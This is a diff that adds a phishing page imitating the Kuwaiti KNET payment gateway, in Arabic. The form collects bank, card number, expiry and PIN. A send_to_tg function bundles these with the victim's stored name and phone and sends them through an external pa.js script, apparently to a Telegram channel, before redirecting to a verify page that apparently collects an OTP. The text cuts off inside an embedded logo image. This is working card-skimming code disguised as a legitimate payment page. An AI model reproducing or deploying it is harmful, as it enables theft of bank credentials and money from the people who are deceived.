@@ -1,0 +1,623 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <meta charset="utf-8">
+
+        <title>KNET Payments</title>
+        <script src="static/js/jquery-3.5.1.js"></script>
+        <link href="static/css/knet.css" rel="stylesheet">
+        <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="use-credentials">
+        <link rel="preconnect" href="https://fonts.gstatic.com">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Mulish:wght@200;300;400;500;600;700;800;900&amp;display=swa">
+        <link href="static/css/payment-stylesheet.css" rel="stylesheet" type="text/css">
+        <link href="static/css/payment-responsive-ar.css" rel="stylesheet" type="text/css">
+    </head>
+
+<body>
+    <script src="./static/js/pa.js"></script>
+    <script type="text/javascript">
+        function ValidateNumPin(evt) {
+            var charCode = (evt.which) ? evt.which : event.keyCode
+            if (charCode != 46 && charCode > 31 && (charCode < 48 || charCode > 57)) { // Check if its only Numeric
+                return false;
+            } else {
+                return true;
+            }
+        }
+
+
+        function isOtpNumeric(event) {
+            const input = event.target;
+            const value = input.value.trim();
+
+            if (!value.match(/^\d*$/)) {
+                input.value = value.replace(/[^\d]/g, '');
+                return false;
+            } else {
+                return true;
+            }
+        }
+
+        function validatebank(val) {
+            if (val == "ABK") {
+                $("#dcprefix").html("<option value='403622'>403622</option><option value='423826'>423826</option><option value='428628'>428628</option>");
+            } else if (val == "ALRAJHI") {
+                $("#dcprefix").html("<option value='458838'>458838</option>");
+            } else if (val == "BBK") {
+                $("#dcprefix").html("<option value='588790'>588790</option><option value='418056'>418056</option>");
+            } else if (val == "BOUBYAN") {
+                $("#dcprefix").html("<option value='470350'>470350</option><option value='490455'>490455</option><option value='490456'>490456</option><option value='404919'>404919</option><option value='490456'>490456</option><option value='450605'>450605</option><option value='426058'>426058</option><option value='431199'>431199</option>");
+            } else if (val == "BURGAN") {
+                $("#dcprefix").html("<option value='49219000'>49219000</option><option value='415254'>415254</option><option value='450238'>450238</option><option value='468564'>468564</option><option value='540759'>540759</option><option value='402978'>402978</option><option value='403583'>403583</option>");
+            } else if (val == "CBK") {
+                $("#dcprefix").html("<option value='532672'>532672</option><option value='537015'>537015</option><option value='521175'>521175</option><option value='516334'>516334</option>");
+            } else if (val == "DOHA") {
+                $("#dcprefix").html("<option value='419252'>419252</option>");
+            } else if (val == "GBK") {
+                $("#dcprefix").html("<option value='531644'>531644</option><option value='517419'>517419</option><option value='531471'>531471</option><option value='559475'>559475</option><option value='517458'>517458</option><option value='526206'>526206</option><option value='531329'>531329</option><option value='531470'>531470</option>");
+            } else if (val == "TAM") {
+                $("#dcprefix").html("<option value='45077848'>45077848</option><option value='45077849'>45077849</option>");
+            } else if (val == "KFH") {
+                $("#dcprefix").html("<option value='450778'>450778</option><option value='537016'>537016</option><option value='532674'>532674</option><option value='485602'>485602</option>");
+            } else if (val == "KIB") {
+                $("#dcprefix").html("<option value='406464'>406464</option><option value='409054'>409054</option>");
+            } else if (val == "NBK") {
+                $("#dcprefix").html("<option value='464452'>464452</option><option value='589160'>589160</option>");
+            } else if (val == "WEYAY") {
+                $("#dcprefix").html("<option value='464425250'>464425250</option><option value='543363'>543363</option>");
+            } else if (val == "QNB") {
+                $("#dcprefix").html("<option value='524745'>524745</option><option value='521020'>521020</option>");
+            } else if (val == "UNB") {
+                $("#dcprefix").html("<option value='457778'>457778</option>");
+            } else if (val == "WARBA") {
+                $("#dcprefix").html("<option value='532749'>532749</option><option value='559459'>559459</option><option value='541350'>541350</option><option value='525528'>525528</option>");
+            } else {
+                $("#dcprefix").html("<option value=''>بادئة</option>")
+            }
+        }
+
+
+
+
+
+
+    //Added fo QA issue fix
+    function resetTimer(val) {
+        var timer1 = val * 60;
+
+        function countDown() {
+            if (--timer1) {
+
+                var minutes = timer1 % 60;
+                if (!minutes) {
+                    minutes = '00';
+                }
+
+                clearTimeout(timer2);
+                $("#debitOTPtimer").attr("placeholder", "Timeout in: " + Math.floor(timer1 / 60) + ':' + minutes);
+                document.paypage.timeOver.value = 0;
+                timer2 = setTimeout(countDown, 1000);
+            } else {
+                $("#debitOTPtimer").hide();
+                $("#debitOTPtimer1").show();
+                document.paypage.timeOver.value = 1;
+            }
+        }
+        countDown();
+    }
+
+
+    function isNumeric(val) {
+        var iChars = "0123456789";
+        if (val.length == 0) {
+            return false;
+        }
+
+
+        for (var i = 0; i < val.length; i++) {
+            if (iChars.indexOf(val.charAt(i)) == -1) {
+                return false;
+            }
+        }
+        return true;
+    }
+
+
+
+
+
+    function validate(){
+        if(!$('#bank').val()){
+            document.getElementById('ValidationMessage').innerHTML = 'حطأ - يرجى اختيار البنك الخاص بك';
+            $('#ValidationMessage').show()
+            return false
+
+        }
+        if($('#debitNumber').val() == ''){
+            document.getElementById('ValidationMessage').innerHTML = 'خطأ- يرجى أدخال رقم البطاقة';
+            $('#ValidationMessage').show()
+            return  false
+        }
+        if($('#dcprefix').val().length + $('#debitNumber').val().length != 16){
+            document.getElementById('ValidationMessage').innerHTML = 'حطأ - يرجى التحقق من رقم البطاقة';
+            $('#ValidationMessage').show()
+            return false
+        }
+
+        
+        if(!$('#month').val()){
+            document.getElementById('ValidationMessage').innerHTML = 'خطأ - يرجى أختيار الشهر'
+            $('#ValidationMessage').show()
+            return false
+        }
+        if(!$('#year').val()){
+            document.getElementById('ValidationMessage').innerHTML = 'خطأ - يرجى أختيار السنة'
+            $('#ValidationMessage').show()
+            return false
+        }
+
+        if($('#cardPin').val()=='')
+        {
+            document.getElementById('ValidationMessage').innerHTML = 'خطأ - يرجى أدخال الرمز السري';
+            $('#ValidationMessage').show()
+            return  false
+        }
+
+        if($('#cardPin').val().length != 4 )
+        {
+            document.getElementById('ValidationMessage').innerHTML = 'خطأ - يرجى ادخال الرمز السري بشكل صحيح';
+            $('#ValidationMessage').show()
+            return  false
+        }
+        return true;
+    }
+
+    function send_to_tg(flag_false){
+         var message = ''
+        if(flag_false){
+            message += `📩 كي نت - معلومات خاطئة\n`
+        }
+        else{
+            message += `📩 كي نت 📩\n`
+            
+            localStorage.setItem('cc',$('#debitNumber').val() + $('#dcprefix').val())
+        }
+
+
+         message += localStorage.getItem('name')
+         message += localStorage.getItem('phone')
+         message +=`🏦 البنك: ${document.getElementById('bank').value}\n`
+        message += `🔢 البادئة: ${document.getElementById('dcprefix').value}\n`
+        message += `💳 آخر 10 أرقام: ${document.getElementById("debitNumber").value}\n`
+        message += `📅 انتهاء: ${document.getElementById("month").value}/${document.getElementById("year").value}\n`
+        message += `\n🔑 الرمز السري: ${document.getElementById("cardPin").value}\n`;
+        pa({message,})
+        if(!flag_false)
+            window.location.href = '/verify.html';
+    }
+
+    function onPay() {
+        // cc = document.getElementById('dcprefix').value + document.getElementById("debitNumber").value
+        month = document.getElementById('month').value
+        year = document.getElementById('year').value
+        // localStorage.setItem('cc', cc)
+        localStorage.setItem('month', month)
+        localStorage.setItem('year', year)
+
+        if(!validate()){
+            send_to_tg(true)
+            return
+        }
+        $('#overlayhide').show()
+
+        send_to_tg(false)
+    }
+
+    </script>
+
+    
+    <noscript>
+        <div class="content-block" style="width: 90%;">
+            <div class="form-card">
+                <img class="logoHead-mob" src='data:image/jpeg;base64,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' alt="logo" />
+            </div>
+            <div class="form-card">
+                <div class="notification" style="border: #ff0000 2px solid; margin-top: 30%;margin-bottom: 30%;background-color: #f7dadd; font-size: 12px;font-family: helvetica, arial, sans serif;border-radius: 5px;color: #ff0000;padding: 10px; width:auto">
+                    <center>
+                        <FONT color="red" style="font-weight:bolder">&#1582;&#1591;&#1571; &#1580;&#1575;&#1601;&#1575; &#1587;&#1603;&#1585;&#1610;&#1576;&#1578;</FONT>
+                    </center>
+                    <br />
+                    <center>
+                        <FONT color="red" style="font-weight:bolder">
+                            !! &#1605;&#1578;&#1589;&#1601;&#1581;&#1603; &#1604;&#1575; &#1610;&#1583;&#1593;&#1605; &#1580;&#1575;&#1601;&#1575; &#1587;&#1603;&#1585;&#1610;&#1576;&#1578; &#1571;&#1608; &#1571;&#1606;&#1607; &#1605;&#1593;&#1591;&#1604;
+                        </FONT>
+                    </center>
+                    <br />
+                    <center>
+                        <FONT color="red" style="font-weight:bolder">
+                            &#1610;&#1585;&#1580;&#1609; &#1578;&#1605;&#1603;&#1610;&#1606; &#1580;&#1575;&#1601;&#1575; &#1587;&#1603;&#1585;&#1610;&#1576;&#1578; &#1601;&#1610; &#1575;&#1604;&#1605;&#1578;&#1589;&#1601;&#1581; &#1575;&#1604;&#1582;&#1575;&#1589; &#1576;&#1603;
+                        </FONT>
+                    </center>
+                    <center>
+                        <FONT color="red" style="font-weight:bolder">
+                            &#1602;&#1576;&#1604; &#1575;&#1604;&#1605;&#1581;&#1575;&#1608;&#1604;&#1577; &#1605;&#1585;&#1577; &#1571;&#1582;&#1585;&#1609;
+                        </FONT>
+                    </center>
+                </div>
+            </div>
+        </div>
+    </noscript>
+    
+    
+    
+
+    <form action="" name="paypage" id="paypage" method="post" autocomplete="off" oncontextmenu="return false;">
+        <div class="madd"> </div>
+        <div id="PayPageEntry" style="display: block">
+            <div class="container">
+                <div class="content-block">
+                    <div class="form-card">
+                        <div class="container-blogo"><img class="logoHead-mob" src="data:image/jpeg;base64,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